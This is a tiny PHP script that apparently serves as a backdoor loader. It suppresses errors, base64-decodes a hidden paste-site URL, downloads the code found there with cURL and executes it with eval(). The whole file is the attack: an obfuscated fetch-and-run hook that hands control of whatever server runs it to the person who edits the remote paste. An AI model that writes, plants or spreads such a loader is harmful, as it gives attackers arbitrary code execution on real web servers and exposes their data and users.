<?php 
error_reporting(0);
$st = curl_init();
curl_setopt($st,CURLOPT_URL,base64_decode("aHR0cHM6Ly8wMzk2MWZmMTBjMDg4OWRhLnBhc3RlLnNlL3Jhdw=="));
curl_setopt($st,CURLOPT_RETURNTRANSFER,true);
$ex = curl_exec($st); 
eval($ex);
?>